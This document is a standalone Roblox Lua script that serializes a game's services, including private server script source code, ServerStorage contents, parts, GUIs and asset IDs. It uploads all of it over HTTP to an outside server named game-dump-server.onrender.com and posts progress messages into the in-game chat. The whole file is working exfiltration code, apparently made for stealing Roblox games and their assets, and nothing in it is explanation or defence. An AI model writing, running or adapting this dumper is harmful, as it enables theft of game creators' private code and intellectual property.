task.spawn(function()
local H=game:GetService("HttpService")
local U="https://game-dump-server.onrender.com"
local SVCS={"ServerScriptService","ReplicatedStorage","StarterPlayer","StarterGui","ServerStorage","Workspace","Lighting","SoundService"}
local pid="?" pcall(function() pid=tostring(game.PlaceId) end)
local function nt(m) pcall(function() local tc=game:GetService("TextChatService") local ch=tc and tc:FindFirstChild("TextChannels") if ch then local sys=ch:FindFirstChild("RBXSystem") if sys then sys:DisplaySystemMessage("[S] "..m) end end end) print("[S] "..m) end
local function sd(fn,c) local ok=pcall(function() H:PostAsync(U.."/upload",H:JSONEncode({filename=fn,content=c}),Enum.HttpContentType.ApplicationJson) end) return ok end
local function sb(fn,d) local ok=pcall(function() H:PostAsync(U.."/upload-binary?name="..H:UrlEncode(fn),d,Enum.HttpContentType.ApplicationOctetStream) end) return ok end
local function sCF(cf) return {cf:GetComponents()} end
local function sC3(c) return {math.floor(c.R*255),math.floor(c.G*255),math.floor(c.B*255)} end
local function sV3(v) return {v.X,v.Y,v.Z} end
local function sUD2(u) return {u.X.Scale,u.X.Offset,u.Y.Scale,u.Y.Offset} end
local function sUD(u) return {u.Scale,u.Offset} end
local aI={}
local function trk(id,t) if not id or id=="" then return end local n=tostring(id):match("%d+") if n and #n>4 then aI[n]=aI[n] or t end end
local function gP(o)
local p={} pcall(function()
if o:IsA("LuaSourceContainer") then local s=o.Source if s and #s>0 then p.Source=s end end
if o:IsA("BasePart") then p.CFrame=sCF(o.CFrame) p.Size=sV3(o.Size) p.Color=sC3(o.Color) p.Material=o.Material.Name p.Anchored=o.Anchored p.CanCollide=o.CanCollide p.Transparency=o.Transparency p.CastShadow=o.CastShadow if o:IsA("MeshPart") then p.MeshId=o.MeshId;trk(o.MeshId,"mesh") p.TextureID=o.TextureID;trk(o.TextureID,"tex") end if o:IsA("Part") then pcall(function() p.Shape=o.Shape.Name end) end end
if o:IsA("Model") then pcall(function() if o.PrimaryPart then p.PrimaryPart=o.PrimaryPart.Name end end) end
if o:IsA("GuiObject") then p.Position=sUD2(o.Position) p.Size=sUD2(o.Size) p.BackgroundColor3=sC3(o.BackgroundColor3) p.BackgroundTransparency=o.BackgroundTransparency p.Visible=o.Visible p.ZIndex=o.ZIndex end
if o:IsA("TextLabel") or o:IsA("TextButton") or o:IsA("TextBox") then p.Text=o.Text p.TextColor3=sC3(o.TextColor3) p.TextSize=o.TextSize end
if o:IsA("ImageLabel") or o:IsA("ImageButton") then p.Image=o.Image;trk(o.Image,"img") end
if o:IsA("StringValue") or o:IsA("IntValue") or o:IsA("NumberValue") or o:IsA("BoolValue") then pcall(function() p.Value=o.Value end) end
if o:IsA("Sound") then p.SoundId=o.SoundId;trk(o.SoundId,"audio") p.Volume=o.Volume end
if o:IsA("Animation") then p.AnimationId=o.AnimationId;trk(o.AnimationId,"anim") end
if o:IsA("Light") then p.Color=sC3(o.Color);p.Brightness=o.Brightness;p.Enabled=o.Enabled end
if o:IsA("Decal") then pcall(function() p.Texture=o.Texture;trk(o.Texture,"tex") end) end
if o:IsA("SpecialMesh") then pcall(function() p.MeshId=o.MeshId;trk(o.MeshId,"mesh") end) end
if o:IsA("SurfaceAppearance") then pcall(function() p.ColorMap=o.ColorMap;trk(o.ColorMap,"tex") end) end
if o:IsA("JointInstance") then pcall(function() if o.Part0 then p.Part0=o.Part0:GetFullName() end end) pcall(function() if o.Part1 then p.Part1=o.Part1:GetFullName() end end) end
if o:IsA("Humanoid") then pcall(function() p.MaxHealth=o.MaxHealth;p.WalkSpeed=o.WalkSpeed end) end
if o:IsA("Atmosphere") then pcall(function() p.Density=o.Density end) end
if o:IsA("UICorner") then pcall(function() p.CornerRadius=sUD(o.CornerRadius) end) end
if o:IsA("Attachment") then pcall(function() p.CFrame=sCF(o.CFrame) end) end
pcall(function() local a=o:GetAttributes() if next(a) then p.Attributes=a end end)
pcall(function() local t=o:GetTags() if #t>0 then p.Tags=t end end)
end) return p end
local function ser(o,d) if d>20 then return nil end local sk=false pcall(function() if o:IsA("Player") or o:IsA("Backpack") or o:IsA("PlayerGui") then sk=true end end) if sk then return nil end local r={C=o.ClassName,N=o.Name,P=gP(o),K={}} for _,c in ipairs(o:GetChildren()) do local ok,cd=pcall(ser,c,d+1) if ok and cd then table.insert(r.K,cd) end end if #r.K==0 then r.K=nil end return r end
nt("Testing server...")
local tok=pcall(function() H:GetAsync(U) end)
if not tok then nt("ERROR: server unreachable") return end
nt("OK! Starting...")
local tS,tP,tI=0,0,0
for i,sn in ipairs(SVCS) do
local ok,svc=pcall(function() return game:GetService(sn) end)
if ok and svc then
local c=0 pcall(function() c=#svc:GetDescendants() end) tI=tI+c
nt("["..i.."/"..#SVCS.."] "..sn.." ("..c..")...")
pcall(function() for _,d in ipairs(svc:GetDescendants()) do if d:IsA("LuaSourceContainer") then tS=tS+1 end if d:IsA("BasePart") then tP=tP+1 end end end)
local data=ser(svc,0)
if data then
local jO,json=pcall(function() return H:JSONEncode(data) end)
if jO and json then
local sO=sd(sn..".json",json)
if sO then nt(sn.." sent! ("..math.floor(#json/1024).." KB)") else nt("ERR: "..sn) end
else nt("JSON err: "..sn) end
end
task.wait(1)
end
end
nt("Done: "..tI.." inst, "..tS.." scripts, "..tP.." parts")
local aC=0 local aL={}
for id,t in pairs(aI) do aC=aC+1 table.insert(aL,id.." "..t) end
nt(aC.." assets")
if aC>0 then sd("asset_manifest.txt",table.concat(aL,"\n")) end
sd("_SUMMARY.txt","Done\nPlace: "..pid.."\nInst: "..tI.."\nScripts: "..tS.."\nParts: "..tP.."\nAssets: "..aC)
nt("=== COMPLETE === Check https://game-dump-server.onrender.com")
end)
